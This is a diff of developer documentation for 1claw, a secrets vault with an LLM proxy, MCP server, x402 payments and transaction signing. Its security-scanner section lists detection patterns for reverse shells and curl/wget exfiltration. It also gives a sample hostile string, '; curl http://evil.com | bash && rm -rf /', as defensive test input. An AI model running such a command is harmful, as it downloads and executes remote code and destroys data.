+| `X-Shroud-Agent-Key` | **Required.** Agent credentials in the form `agent_id:api_key` (e.g. `550e8400-e29b-41d4-a716-446655440000:ocv_...`). The API key is the agent’s `ocv_` key from 1Claw. |
+| `X-Shroud-Provider` | **Required.** Provider identifier. Must match a [supported provider](#supported-providers) name (e.g. `openai`, `anthropic`, `google`, `gemini`). |
+| `Content-Type` | `application/json` for request body. |
+
+### Optional headers
+
+| Header | Description |
+|--------|-------------|
+| `X-Shroud-Api-Key` | Provider API key. If omitted, Shroud tries to resolve the key from the vault (see [Vault key resolution](#vault-key-resolution)). |
+| `X-Shroud-Model` | Model name (e.g. `gpt-4o-mini`, `gemini-2.0-flash`). Can also be set in the request body for some providers. |
+
+### Auth format: `X-Shroud-Agent-Key`
+
+The value must be exactly:
+
+```text
+agent_id:api_key
+```
+
+- `agent_id`: the agent’s UUID from 1Claw (e.g. from the dashboard or `GET /v1/agents/me`).
+- `api_key`: the agent’s API key (e.g. `ocv_...`).
+
+Example: `X-Shroud-Agent-Key: 550e8400-e29b-41d4-a716-446655440000:ocv_abc123...`
+
+### Vault key resolution
+
+If you do **not** send `X-Shroud-Api-Key`, Shroud looks up the provider key in the vault:
+
+- **Default path:** `providers/{provider}/api-key` in a vault the agent can read (e.g. grant the agent read access to `providers/openai/*` or `providers/google/*`).
+- **Override via header:** You can pass a vault reference so Shroud fetches the key from a specific path:
+  - `X-Shroud-Api-Key: vault://{vault_id}/{secret_path}`
+  - Example: `X-Shroud-Api-Key: vault://a1b2c3d4-e5f6-7890-abcd-ef1234567890/gemini/api-key`
+
+The agent must have read access to that vault path.
+
+### Supported providers
+
+Shroud supports the following LLM providers. Set `X-Shroud-Provider` to one of the values below (lowercase).
+
+| Provider value | LLM / API |
+|----------------|-----------|
+| `openai`       | OpenAI (GPT-4o, o1, etc.) |
+| `anthropic`    | Anthropic (Claude) |
+| `google`       | Google Gemini (Generative Language API) |
+| `gemini`       | Alias for `google` — same as above |
+| `mistral`      | Mistral |
+| `cohere`       | Cohere |
+| `openrouter`   | OpenRouter (aggregates many models; single API key) |
+
+- **Gemini:** Use `X-Shroud-Provider: google` or `gemini`. Store the API key at `providers/google/api-key` (or use `X-Shroud-Api-Key`). Shroud maps `/v1/chat/completions` to Google’s `generateContent` endpoint.
+- **OpenRouter:** Use `X-Shroud-Provider: openrouter`. One API key gives access to many models; set `model` in the request body to the OpenRouter model ID (e.g. `anthropic/claude-3.5-sonnet`).
+
+### Request and response format
+
+- **OpenAI-style (OpenAI, Mistral, Cohere, OpenRouter):** Request body is the standard [OpenAI chat completions](https://platform.openai.com/docs/api-reference/chat/create) shape: `{ "model", "messages", "max_tokens", "stream", ... }`. Response shape is the same. For OpenRouter, set `model` to the OpenRouter model ID (e.g. `anthropic/claude-3.5-sonnet`).
+- **Google (Gemini):** Shroud accepts an OpenAI-compatible request and maps it to the Google `generateContent` API; use `model` values such as `gemini-2.0-flash`, `gemini-2.5-pro` (see provider config for the full allowlist).
+- **Anthropic:** Uses `/v1/messages`; request/response follow Anthropic’s API.
+
+### Example: cURL
+
+```bash
+# Using agent key and vault-resolved provider key (no X-Shroud-Api-Key)
+curl -X POST "https://shroud.1claw.xyz/v1/chat/completions" \
+  -H "X-Shroud-Agent-Key: YOUR_AGENT_ID:YOUR_AGENT_API_KEY" \
+  -H "X-Shroud-Provider: google" \
+  -H "Content-Type: application/json" \
+  -d '{"model":"gemini-2.0-flash","messages":[{"role":"user","content":"Hello"}]}'
+
+# With explicit vault key path
+curl -X POST "https://shroud.1claw.xyz/v1/chat/completions" \
+  -H "X-Shroud-Agent-Key: YOUR_AGENT_ID:YOUR_AGENT_API_KEY" \
+  -H "X-Shroud-Provider: anthropic" \
+  -H "X-Shroud-Api-Key: vault://VAULT_ID/api-keys/anthropic" \
+  -H "Content-Type: application/json" \
+  -d '{"model":"claude-sonnet-4-5-20250929","messages":[{"role":"user","content":"Hello"}]}'
+```
+
+### Example: TypeScript (fetch)
+
+```typescript
+const SHROUD_URL = "https://shroud.1claw.xyz";
+const agentId = process.env.ONECLAW_AGENT_ID!;
+const agentApiKey = process.env.ONECLAW_AGENT_API_KEY!;
+
+const res = await fetch(`${SHROUD_URL}/v1/chat/completions`, {
+  method: "POST",
+  headers: {
+    "X-Shroud-Agent-Key": `${agentId}:${agentApiKey}`,
+    "X-Shroud-Provider": "google",
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify({
+    model: "gemini-2.0-flash",
+    messages: [{ role: "user", content: "Hello" }],
+    max_tokens: 1024,
+  }),
+});
+
+const data = await res.json();
+// OpenAI-style response: data.choices[0].message.content
+```
+
+### Errors you may see
+
+| HTTP | Message | Meaning |
+|------|---------|--------|
+| 400 | `missing X-Shroud-Provider header` | Send `X-Shroud-Provider` with a supported provider name. |
+| 401 | `missing X-Shroud-Agent-Key header` | Send `X-Shroud-Agent-Key` with `agent_id:api_key`. |
+| 401 | `invalid agent key format: expected 'agent_id:api_key'` | Use exactly one colon; left side = agent UUID, right side = API key. |
+| 401 | `no API key: vault lookup failed and no X-Shroud-Api-Key header` | Provide `X-Shroud-Api-Key` or store the key in the vault at `providers/{provider}/api-key` and grant the agent read access. |
+| 502 | `provider X has no client pool` | Provider name is not supported or is misspelled. Use a value from the [supported providers](#supported-providers) table (e.g. `google` or `gemini` for Gemini). |
+
+---
 
 ## Why This Matters
 
@@ -4075,6 +4713,166 @@ Quick fixes for issues you might hit as a user of the API, SDK, CLI, or MCP.
 
 For a full list of error codes and response shapes, see [Error codes](/docs/reference/error-codes). For how the API processes requests (auth, rate limit, billing), see [Request pipeline](/docs/reference/request-pipeline).
 
+## Need help?
+
+- **Community:** [Join the 1claw Telegram group](https://t.me/+jG4Rm7XHJ79mNDRh) for questions and support.
+- **Email:** [ops@1claw.xyz](mailto:ops@1claw.xyz) for account or billing issues.
+
+
+---
+
+## x402 Integration Guide
+
+---
+title: x402 Micropayments
+description: Pay for API overages on-chain with the x402 protocol. End-to-end flow for agents using Base USDC.
+sidebar_position: 6
+---
+
+# x402 Integration Guide
+
+When your organization's request quota is exceeded, the 1claw API can return **402 Payment Required** with an [x402](https://www.x402.org/)-compliant body. You can pay for overages on-chain (Base, USDC) and retry the request with an `X-PAYMENT` header so your agent can continue without prepaid credits.
+
+This guide covers the 402 response format, how to obtain and send a payment proof, and a minimal code example.
+
+## When you get 402
+
+- **Authenticated requests over quota:** Your tier's monthly request limit is exhausted and your org's overage method is set to **x402** (or you have no prepaid credits).
+- **Unauthenticated requests on paid routes:** Some endpoints require payment when no valid Bearer token is present; the API returns 402 so clients can pay and retry.
+
+Toggle overage method in [Settings → Billing](https://1claw.xyz/settings/billing) or via `PATCH /v1/billing/overage-method` with `{"method": "x402"}`.
+
+## 402 response format
+
+The response body follows the [x402 spec](https://docs.g402.ai/docs/api/response-format) and is used by the x402scan marketplace and compatible wallets:
+
+```json
+{
+  "x402Version": 1,
+  "accepts": [
+    {
+      "scheme": "exact",
+      "network": "eip155:8453",
+      "maxAmountRequired": "1500",
+      "resource": "https://api.1claw.xyz/v1/vaults/{vault_id}/secrets/{path}",
+      "payTo": "0x...",
+      "maxTimeoutSeconds": 60,
+      "asset": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
+      "description": "read_secret",
+      "mimeType": "application/json"
+    }
+  ],
+  "description": "read_secret"
+}
+```
+
+| Field | Meaning |
+|-------|--------|
+| `accepts[].maxAmountRequired` | Amount in **atomic units** (USDC on Base has 6 decimals). Pay this amount (or the exact scheme amount) to the `payTo` address. |
+| `accepts[].resource` | Full URL of the request that triggered 402. Retry this URL with the `X-PAYMENT` header after paying. |
+| `accepts[].payTo` | Recipient address (1claw's receiving address on Base). |
+| `accepts[].asset` | USDC on Base mainnet contract address. |
+| `accepts[].network` | Chain: `eip155:8453` = Base. |
+
+## Pay and retry flow
+
+1. **Receive 402** — Your client gets `402 Payment Required` and parses the JSON body.
+2. **Pay on-chain** — Transfer the required USDC (atomic units) to `payTo` on Base, or use an x402-compatible wallet/SDK that produces a payment proof.
+3. **Obtain payment proof** — The proof is typically a signed message or transaction reference that the x402 **facilitator** can verify. 1claw uses the [Coinbase CDP facilitator](https://api.cdp.coinbase.com/platform/v2/x402) by default; the facilitator verifies the payment and returns a proof token.
+4. **Retry with header** — Send the **same request** again with header `X-PAYMENT: <proof>` (the value the facilitator gives you after verifying the payment).
+5. **API processes request** — The middleware verifies the proof with the facilitator, then allows the request through; after a successful response, the backend settles the payment with the facilitator.
+
+Replay protection: each payment proof is tied to the resource URL and amount; duplicate proofs are rejected.
+
+## Example: curl (manual)
+
+After receiving 402, you would normally use an x402 client library to pay and get the proof. For illustration, once you have a proof string (e.g. from a facilitator or wallet):
+
+```bash
+# First request — may return 402 if over quota
+RESP=$(curl -s -w "\n%{http_code}" -X GET \
+  "https://api.1claw.xyz/v1/vaults/$VAULT_ID/secrets/my-key" \
+  -H "Authorization: Bearer $AGENT_TOKEN")
+
+HTTP_CODE=$(echo "$RESP" | tail -n1)
+BODY=$(echo "$RESP" | sed '$d')
+
+if [ "$HTTP_CODE" = "402" ]; then
+  # Parse BODY for accepts[0].resource, maxAmountRequired, payTo, asset
+  # Pay on Base (USDC) to payTo, then get X-PAYMENT proof from facilitator
+  # Retry with proof:
+  curl -X GET "https://api.1claw.xyz/v1/vaults/$VAULT_ID/secrets/my-key" \
+    -H "Authorization: Bearer $AGENT_TOKEN" \
+    -H "X-PAYMENT: <proof-from-facilitator>"
+fi
+```
+
+## Example: TypeScript (agent with retry)
+
+```typescript
+const BASE = "https://api.1claw.xyz";
+
+async function getSecretWithX402(
+  vaultId: string,
+  path: string,
+  agentToken: string,
+  payWithX402: (amountAtomic: string, payTo: string, resource: string) => Promise<string>
+): Promise<unknown> {
+  const url = `${BASE}/v1/vaults/${vaultId}/secrets/${encodeURIComponent(path)}`;
+  const headers: Record<string, string> = {
+    Authorization: `Bearer ${agentToken}`,
+    "Content-Type": "application/json",
+  };
+
+  let res = await fetch(url, { headers });
+  if (res.status === 402) {
+    const body = await res.json();
+    const accept = body.accepts?.[0];
+    if (!accept) throw new Error("402 response missing accepts");
+    const proof = await payWithX402(
+      accept.maxAmountRequired,
+      accept.payTo,
+      accept.resource
+    );
+    headers["X-PAYMENT"] = proof;
+    res = await fetch(url, { headers });
+  }
+  if (!res.ok) throw new Error(`API ${res.status}: ${await res.text()}`);
+  return res.json();
+}
+
+// payWithX402: use an x402 client or CDP facilitator to pay on Base and return proof.
+// Example stub — replace with real payment flow (e.g. @coinbase/sdk, or facilitator API).
+async function payWithX402(
+  _amountAtomic: string,
+  _payTo: string,
+  _resource: string
+): Promise<string> {
+  // 1. Transfer USDC to payTo on Base (amountAtomic = 6-decimal units).
+  // 2. Call facilitator verify endpoint with payment details; get proof.
+  // 3. Return proof string for X-PAYMENT header.
+  throw new Error("Implement: pay on Base, then get proof from facilitator");
+}
+```
+
+## Facilitator (CDP)
+
+1claw uses the Coinbase CDP x402 facilitator by default. The API sends the payment proof to the facilitator's **verify** endpoint before allowing the request, and to **settle** after a successful response. Your agent does not call the facilitator directly unless you implement a custom payment flow; most integrations use a wallet or SDK that speaks x402 and produces the proof the facilitator expects.
+
+For more on the protocol and marketplace: [x402.org](https://www.x402.org/), [docs.g402.ai](https://docs.g402.ai/).
+
+## Summary
+
+| Step | Action |
+|------|--------|
+| 1 | Request fails with **402**; parse `accepts[0]` for `maxAmountRequired`, `payTo`, `resource`, `asset`. |
+| 2 | Pay the required USDC (atomic units) on Base to `payTo`. |
+| 3 | Obtain an x402 payment proof (e.g. via facilitator or x402-capable wallet). |
+| 4 | Retry the **same** request URL with header `X-PAYMENT: <proof>`. |
+| 5 | API verifies proof, processes request, then settles payment. |
+
+See [Billing & Usage](/docs/guides/billing-and-usage) for subscription tiers, prepaid credits (alternative to x402), and overage pricing.
+
 
 ---
 
@@ -4415,6 +5213,9 @@ await client.auth.login({
 ## Google OAuth
 
 **Endpoint:** `POST /v1/auth/google`  
+
+The server verifies the Google ID token locally via [Google's JWKS](https://www.googleapis.com/oauth2/v3/certs) (RS256 signature, audience, issuer, expiry, email_verified). No external tokeninfo call.
+
 **Request body:**
 
 | Field     | Type   | Required | Description                    |
@@ -4666,11 +5467,8 @@ curl -X POST "https://api.1claw.xyz/v1/vaults/ae370174-9aee-4b02-ba7c-d1519930c7
 <TabItem value="typescript" label="TypeScript">
 
 ```typescript
-await client.access.grantAgent({
-  vault_id: vaultId,
-  secret_path_pattern: "**",
-  principal_id: agentId,
-  permissions: ["read"],
+await client.access.grantAgent(vaultId, agentId, ["read"], {
+  secretPathPattern: "**",
 });
 ```
 
@@ -5247,9 +6045,19 @@ sidebar_position: 0
 
 1claw is a **cloud-hosted Hardware Security Module (HSM) secrets manager** for humans and AI agents. It lets you store API keys, tokens, and other credentials in a vault encrypted by keys that never leave the HSM. You control which agents can access which secrets, with what permissions, and for how long — and agents fetch secrets at runtime instead of holding them in context or environment.
 
-## The problem 1claw solves
+## Three products
 
-AI agents often need secrets (API keys, tokens, DB credentials) to call external services. If you paste a secret into a chat or put it in an agent's environment, it can be logged, leaked, or retained. 1claw keeps secrets in an HSM-backed vault and gives agents **scoped, audited, revocable** access: the agent authenticates to 1claw and requests a secret by path; 1claw returns the decrypted value only if the agent is allowed. The agent never stores the secret; you can revoke access or rotate the secret at any time.
+1claw is built around three products that work together:
+
+| Product | What it does | Docs |
+|--------|----------------|------|
+| **Vault** | Store and manage secrets; Human API, Agent API, and MCP for just-in-time secret access | [Vault →](/docs/human-api/overview) |
+| **Shroud** | LLM proxy that inspects and redacts before forwarding to OpenAI, Anthropic, Google (Gemini), and others; blocks prompt injection and hides secrets | [Shroud →](/docs/guides/shroud) |
+| **Intents** | Let agents sign and broadcast blockchain transactions without ever seeing private keys | [Intents →](/docs/guides/intents-api) |
+
+- **Vault** is the core: dashboard, REST API, MCP server, CLI, and SDKs all talk to the same vault. Create vaults, store secrets at paths, register agents, and attach policies that grant read/write access.
+- **Shroud** sits between your agent and the LLM provider. Send requests to `shroud.1claw.xyz` instead of directly to the provider; Shroud enforces policies, redacts secrets, and detects prompt injection.
+- **Intents** extends the vault with transaction signing. Enable the Intents API on an agent; the agent submits transaction intents; the server signs in the HSM (or in Shroud’s TEE) and broadcasts. The private key never leaves the vault.
 
 ## Architecture
 
@@ -5257,7 +6065,7 @@ AI agents often need secrets (API keys, tokens, DB credentials) to call external
 ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
 │  Dashboard  │────▶│  Vault API  │◀────│  MCP Server │
 │  (Next.js)  │     │  (Rust)     │     │  (Node.js)  │
-│  1claw.xyz  │     │ api.1claw.xyz│    │mcp.1claw.xyz│
+│  1claw.xyz  │     │ api.1claw.xyz     │ mcp.1claw.xyz
 └─────────────┘     └──────┬──────┘     └─────────────┘
                            │
                 ┌──────────┼──────────┐
@@ -5268,9 +6076,10 @@ AI agents often need secrets (API keys, tokens, DB credentials) to call external
           └──────────┘ └──────┘ └──────────┘
 ```
 
-- **Dashboard** — The web UI at [1claw.xyz](https://1claw.xyz) where humans manage vaults, secrets, agents, and policies. After you sign in, the left sidebar gives you: **Dashboard**, **Vaults**, **Agents**, **Sharing**, **Audit Log**, **Security**, **API Keys**, **Billing**, and **Team**.
+- **Dashboard** — The web UI at [1claw.xyz](https://1claw.xyz) where humans manage vaults, secrets, agents, and policies.
 - **Vault API** — The Rust backend that handles authentication, envelope encryption, policy enforcement, and all CRUD operations. Both the dashboard and MCP server talk to it.
-- **MCP Server** — A [Model Context Protocol](https://modelcontextprotocol.io) server that gives AI agents (Claude, Cursor, GPT) just-in-time access to vault secrets. Available hosted at `mcp.1claw.xyz` or as a local stdio process.
+- **Shroud** — Optional LLM proxy at [shroud.1claw.xyz](https://shroud.1claw.xyz); agents can send LLM traffic through Shroud for inspection and redaction. Transaction signing can also run in Shroud’s TEE.
+- **MCP Server** — A [Model Context Protocol](https://modelcontextprotocol.io) server that gives AI agents (Claude, Cursor, GPT) just-in-time access to vault secrets and Intents. Hosted at `mcp.1claw.xyz` or run locally.
 
 ### How humans and agents interact
 
@@ -5288,26 +6097,26 @@ The same REST API serves both personas:
 
 Base URL: `https://api.1claw.xyz` (or your Cloud Run URL). The dashboard at [1claw.xyz](https://1claw.xyz) proxies `/api/v1/*` to the same API.
 
-## What you'll find in these docs
+## How to navigate these docs
 
-- **Concepts** — Vaults, secrets, policies, agents, HSM architecture, and [parts of 1claw](/docs/concepts/parts-of-1claw) (API, Dashboard, MCP, CLI, SDK).
-- **Quickstart** — Get a token (human or agent) and read/write a secret.
-- **Human API** — Every endpoint for vaults, secrets, policies, agents, billing, audit.
-- **Agent API** — Auth and fetching secrets; same endpoints with agent JWT.
-- **MCP Server** — Give AI agents (Claude, Cursor, GPT) direct access to secrets via the Model Context Protocol. Hosted at `mcp.1claw.xyz` or run locally.
-- **SDKs** — TypeScript/JavaScript and curl examples.
-- **Guides** — Give an agent access, rotate secrets, revoke access, billing & usage, troubleshooting, and more.
-- **Security** — HSM, key hierarchy, zero-trust, compliance.
-- **Reference** — API reference, request pipeline, error codes, rate limits, [glossary](/docs/reference/glossary), changelog.
+- **[Concepts](/docs/concepts/what-is-1claw)** — Vaults, secrets, policies, agents, HSM architecture, and [parts of 1claw](/docs/concepts/parts-of-1claw) (three products + Dashboard, API, MCP, CLI, SDK).
+- **[Vault](/docs/human-api/overview)** — Quickstart, Human API, Agent API, MCP Server, and all vault-related guides (access control, rotation, CMEK, sharing, CLI, billing, troubleshooting).
+- **[Shroud](/docs/guides/shroud)** — LLM proxy setup, supported providers (OpenAI, Anthropic, Google/Gemini, OpenRouter, etc.), threat detection, and vault-backed API keys.
+- **[Intents](/docs/guides/intents-api)** — Enabling the Intents API, submitting transactions, guardrails, simulation, and supported chains.
+- **[SDKs](/docs/sdks/overview)** — TypeScript/JavaScript, Python, and curl examples.
+- **[Security](/docs/security/hsm-overview)** — HSM, key hierarchy, zero-trust, compliance.
+- **[Reference](/docs/reference/api-reference)** — API reference, request pipeline, error codes, rate limits, [glossary](/docs/reference/glossary), changelog.
 
 ## Next steps
 
 - [What is 1claw?](/docs/concepts/what-is-1claw) — Core concepts in more detail.
-- [Parts of 1claw](/docs/concepts/parts-of-1claw) — API, Dashboard, MCP, CLI, SDK: what each is for and when to use it.
+- [Parts of 1claw](/docs/concepts/parts-of-1claw) — Three products (Vault, Shroud, Intents) and how to use them (Dashboard, API, MCP, CLI, SDK).
 - [Quickstart for humans](/docs/quickstart/humans) — Log in and store your first secret.
 - [Quickstart for agents](/docs/quickstart/agents) — Get an agent token and fetch a secret.
-- [MCP Server](/docs/mcp/overview) — Connect AI agents to your vault via MCP.
+- [Shroud](/docs/guides/shroud) — Route LLM traffic through Shroud for inspection and redaction.
+- [Intents API](/docs/guides/intents-api) — Let agents sign transactions without seeing keys.
 - [Glossary](/docs/reference/glossary) — Definitions of vault, secret, policy, agent, and other terms.
+
 
 ---
 
@@ -5396,9 +6205,9 @@ sidebar_position: 0
 
 # MCP Server
 
-The **1claw MCP server** (`@1claw/mcp`) implements the [Model Context Protocol](https://modelcontextprotocol.io) to give AI agents secure, just-in-time access to secrets stored in a 1claw vault.
+The **1claw MCP server** (`@1claw/mcp`) implements the [Model Context Protocol](https://modelcontextprotocol.io) to give AI agents secure, just-in-time access to secrets stored in a 1claw vault — and a standalone security scanner for detecting malicious LLM content.
 
-Secrets are fetched at runtime and never persisted in the LLM context window beyond the moment they are used.
+Secrets are fetched at runtime and never persisted in the LLM context window beyond the moment they are used. The `inspect_content` tool can run **without vault credentials**, making it available to anyone running local models.
 
 ## How it works
 
@@ -5429,6 +6238,25 @@ Secrets are fetched at runtime and never persisted in the LLM context window bey
 | -------------- | --------------------------------------------------- | ------------------- | --------------------------- |
 | **stdio**      | Local — Claude Desktop, Cursor, any MCP client      | Env vars            | N/A (runs locally)          |
 | **httpStream** | Hosted — any MCP client with HTTP streaming support | Per-request headers | `https://mcp.1claw.xyz/mcp` |
+| **local-only** | Security tools only — no vault credentials needed   | None                | N/A (runs locally)          |
+
+### Local-only mode
+
+Set `ONECLAW_LOCAL_ONLY=true` to start the server with only the `inspect_content` tool. No 1claw account or API keys required. Useful for users running local models (Ollama, LM Studio, llama.cpp) who want threat detection without secret management.
+
+```json
+{
+    "mcpServers": {
+        "1claw": {
+            "command": "npx",
+            "args": ["-y", "@1claw/mcp"],
+            "env": {
+                "ONECLAW_LOCAL_ONLY": "true"
+            }
+        }
+    }
+}
+```
 
 ## Tools
 
@@ -5445,6 +6273,7 @@ Secrets are fetched at runtime and never persisted in the LLM context window bey
 | `list_vaults`      | List all accessible vaults                                          | Read       |
 | `grant_access`     | Grant a user or agent access to a vault                             | Write      |
 | `share_secret`     | Share a secret with someone by email                                | Write      |
+| `inspect_content`  | Analyze text for prompt injection, command injection, PII, and more | Read       |
 
 ## Resources
 
@@ -5502,6 +6331,73 @@ This means you control what the AI agent can access by configuring policies in t
 ### Audit trail
 
 Every secret access through the MCP server is recorded in the vault's audit log. You can view audit events in the dashboard or query them via `GET /v1/audit/events`.
+
+## Inspection pipeline
+
+All tool calls pass through a security inspection pipeline. It runs **by default** (opt-out, not opt-in) and covers both inputs (before execution) and outputs (after execution).
+
+### Input inspection
+
+Before a tool runs, the server inspects the arguments for:
+
+| Check | What it catches | Severity |
+|-------|----------------|----------|
+| **Command injection** | Shell chaining, command substitution, reverse shells, path traversal | Critical/High |
+| **Encoding obfuscation** | Long base64, hex escapes, Unicode escapes | Medium |
+| **Social engineering** | Urgency, authority claims, secrecy, bypass requests, credential fishing | High/Critical |
+| **Network threats** | ngrok/pastebin URLs, IP-based URLs, `curl`/`wget` exfiltration | High/Critical |
+| **Unicode normalization** | Zero-width chars, Cyrillic/Greek homoglyphs | Medium |
+| **PII detection** | Email addresses, SSNs, credit card numbers, phone numbers, AWS keys, private key headers | Medium–Critical |
+| **Exfiltration protection** | Previously fetched secret values appearing in non-secret tool inputs | Critical |
+
+In the default `block` mode, critical or high-severity threats reject the tool call. In `surgical` mode, Unicode is normalized but the call proceeds. In `log_only` mode, threats are logged but never blocked.
+
+### Output inspection
+
+After a tool returns, the server inspects the result for:
+
+| Check | What it does |
+|-------|-------------|
+| **Threat detection** | Same patterns as input (logged, not blocked) |
+| **PII detection** | Same patterns as input (logged) |
+| **Secret redaction** | If a known secret value (fetched via `get_secret` or `get_env_bundle`) appears in the output of a **non-secret** tool, it is replaced with `[REDACTED:path]` before the result reaches the LLM context window |
+
+Secret redaction tracks every value retrieved during the session. This means if an agent fetches `api-keys/stripe` and later a tool accidentally includes that value in its output, the value is scrubbed.
+
+### Exfiltration protection
+
+When an agent fetches a secret, the server remembers the value. If that value later appears as input to a tool that shouldn't handle raw secrets (e.g., `share_secret`, `grant_access`), the server flags it as a potential exfiltration attempt.
+
+| Mode | Behavior |
+|------|----------|
+| `warn` (default) | Logs the threat, allows the call |
+| `block` | Rejects the call with a security error |
+| `off` | Disables exfiltration checks |
+
+Tools that legitimately handle secrets (`get_secret`, `get_env_bundle`, `put_secret`, `rotate_and_store`) are exempt from exfiltration checks.
+
+### Configuration
+
+All features are on by default and can be tuned via environment variables:
+
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `ONECLAW_MCP_SECURITY_ENABLED` | `true` | Master switch — set to `false` to disable all inspection |
+| `ONECLAW_MCP_SANITIZATION_MODE` | `block` | `block`, `surgical`, or `log_only` |
+| `ONECLAW_MCP_REDACT_SECRETS` | `true` | Redact known secret values from non-secret tool outputs |
+| `ONECLAW_MCP_PII_DETECTION` | `true` | Detect PII patterns in inputs and outputs |
+| `ONECLAW_MCP_EXFIL_PROTECTION` | `warn` | `block`, `warn`, or `off` for secret exfiltration checks |
+
+## Standalone inspection via `inspect_content`
+
+In addition to the automatic pipeline, the `inspect_content` tool lets you proactively check any text on demand. This is useful for:
+
+- **Checking LLM outputs** before acting on them (e.g., before running generated code)
+- **Validating user inputs** before passing them to tools
+- **Auditing messages** between agents in multi-agent setups
+- **Local model safety** — run with `ONECLAW_LOCAL_ONLY=true` to use the scanner without a 1claw account
+
+The tool runs the same detection engine as the automatic pipeline and returns a structured verdict with threat details.
 
 ## Best practices
 
@@ -5660,6 +6556,10 @@ Add to `.cursor/mcp.json` in your project root:
 }
 ```
 
+### Claude Code
+
+Claude Code uses the same MCP configuration as Cursor. Use either the **hosted** or **local (stdio)** config above (Cursor section). Then optionally [install the 1claw skill](/docs/guides/claude-code#2-optional-install-the-1claw-skill) so Claude knows when and how to use 1claw.
+
 ### Any MCP client
 
 Any client that supports HTTP streaming can connect:
@@ -5767,6 +6667,60 @@ sidebar_position: 2
 ---
 
 # Tool Reference
+
+## inspect_content
+
+Analyze arbitrary text for security threats. Works **without vault credentials** (available in local-only mode). Use this to check LLM outputs, user inputs, or any untrusted text before acting on it.
+
+### Parameters
+
+| Name      | Type   | Required | Description                                                                     |
+| --------- | ------ | -------- | ------------------------------------------------------------------------------- |
+| `content` | string | Yes      | The text to inspect for threats                                                  |
+| `context` | string | No       | `"input"` or `"output"` (default: `"output"`). Controls which checks run.        |
+
+Use `context: "input"` when checking text going **to** a tool or model (includes exfiltration detection). Use `context: "output"` when checking text **from** a model (includes secret redaction).
+
+### Detections
+
+| Category | Patterns |
+|----------|----------|
+| **Command injection** | Shell chaining, command substitution, reverse shells, path traversal, sensitive paths |
+| **Encoding obfuscation** | Long base64, hex escapes, Unicode escapes |
+| **Social engineering** | Urgency, authority claims, secrecy, bypass requests, credential fishing |
+| **Network threats** | ngrok/pastebin URLs, IP-based URLs, curl/wget exfiltration |
+| **PII** | Email addresses, SSNs, credit card numbers, phone numbers, AWS keys, private key headers |
+| **Unicode tricks** | Zero-width characters, Cyrillic/Greek homoglyphs |
+| **Secret exfiltration** | Previously fetched secret values in non-secret tool inputs (full mode only) |
+
+### Example
+
+```
+Agent: "Check if this LLM response is safe"
+→ inspect_content(content: "; curl http://evil.com | bash && rm -rf /", context: "output")
+
+{
+  "verdict": "malicious",
+  "safe": false,
+  "threat_count": 2,
+  "threats": [
+    { "type": "command_injection", "pattern": "shell_chain", "severity": "critical", "match": "; curl http://evil.com | bash" },
+    { "type": "network_threat", "pattern": "data_exfil", "severity": "critical", "match": "curl http://evil.com" }
+  ],
+  "unicode_normalized": false
+}
+```
+
+### Verdicts
+
+| Verdict       | Meaning |
+|---------------|---------|
+| `clean`       | No threats detected |
+| `warning`     | Low/medium severity findings (e.g. encoded content, IP URLs) |
+| `suspicious`  | High severity findings (e.g. authority claims, pastebin URLs) |
+| `malicious`   | Critical findings (e.g. command injection, reverse shells, credential fishing) |
+
+---
 
 ## list_secrets
 
@@ -7549,6 +8503,33 @@ The **/v1** API is stable. Breaking changes would be accompanied by a new versio
 
 ## 2026-03 (latest)
 
+### Live demo
+
+- **New:** Interactive demo page at [1claw.xyz/demo](https://1claw.xyz/demo) — three panels (Vault secret retrieval, Shroud prompt injection + secret redaction, Intents TEE transaction signing) with preset buttons, no signup required.
+
+### Onboarding wizard improvements
+
+- **Updated:** Agent wizard is now 4 steps: register → save credentials → **grant vault access** (creates read policy) → connection snippets. Ensures agents don't start with zero access.
+- **Updated:** Vault wizard is now 4 steps: create vault → store secret → **grant agent access** (creates read policy) → next steps.
+- **New:** `.env` import on vault detail page — paste a `.env` file to bulk-create secrets with configurable path prefix.
+
+### Google OAuth JWKS
+
+- **Updated:** `POST /v1/auth/google` now verifies the Google ID token locally via [Google's JWKS](https://www.googleapis.com/oauth2/v3/certs) (RS256 signature, audience, issuer, expiry). Replaces the previous tokeninfo endpoint call. More reliable (no URL length limits).
+
+### SSO (WorkOS)
+
+- **New:** WorkOS SAML/OIDC SSO — `GET /v1/auth/sso/authorize`, callback handler, "Sign in with SSO" button on login page.
+
+### Security fixes (2026-03-16 audit)
+
+- **Fixed (C-3):** Dashboard auth bypass — `PUBLIC_PAGES` prefix match for `"/"` matched all paths. Now uses exact match.
+- **Fixed (C-4):** MFA token replay — MFA challenge tokens are now single-use (jti revoked after verification).
+- **Fixed (C-5):** Cross-vault IDOR — agent JWTs with empty `vault_ids` no longer grant unrestricted access; vault IDs are derived from access policies.
+- **Fixed (H-19):** Ed25519 SPKI DER parsing uses proper ASN.1 validation instead of a heuristic.
+- **New:** `signing_key_path` validation restricts Intents API key paths to `keys/*`, `wallets/*`, or `agents/{id}/keys/*`.
+- **New:** Shroud strips sensitive headers (authorization, cookies, IP headers) before forwarding to upstream LLM providers.
+
 ### x402 marketplace compatibility
 
 - **Updated:** 402 Payment Required response body now aligns with [docs.g402.ai](https://docs.g402.ai/docs/api/response-format) and x402scan: `x402Version`, `accepts[]` with `maxAmountRequired` (atomic units), `resource` (full URL), `payTo`, `maxTimeoutSeconds`, `asset`, `description`, `mimeType`. Enables registration on x402 marketplaces.
@@ -7766,6 +8747,21 @@ When creating vaults, secrets, or agents beyond your tier's quota, the API retur
 ```
 
 Check the `type` field to distinguish permission errors from quota errors. The `detail` includes the current count, limit, and tier name.
+
+## Intents API errors
+
+Transaction and simulation endpoints return these status codes and messages:
+
+| Code | When | `detail` (examples) |
+|------|------|---------------------|
+| 400 | Bad Request | Invalid `value`, `data` (hex), `to` address, or `signing_key_path`. `signing_key_path` must start with `keys/`, `wallets/`, or `agents/`. Unknown chain name. Invalid `max_fee_per_gas` / `max_priority_fee_per_gas` / `gas_price`. |
+| 403 | Forbidden | Agent not allowed on this chain (`tx_allowed_chains`). Destination not in `tx_to_allowlist`. Transaction value exceeds `tx_max_value_eth`. Would exceed `tx_daily_limit_eth`. Cannot submit on behalf of another agent. |
+| 404 | Not Found | Agent or transaction not found. |
+| 409 | Conflict | Idempotency key reused (duplicate request); retry with a new key or wait. |
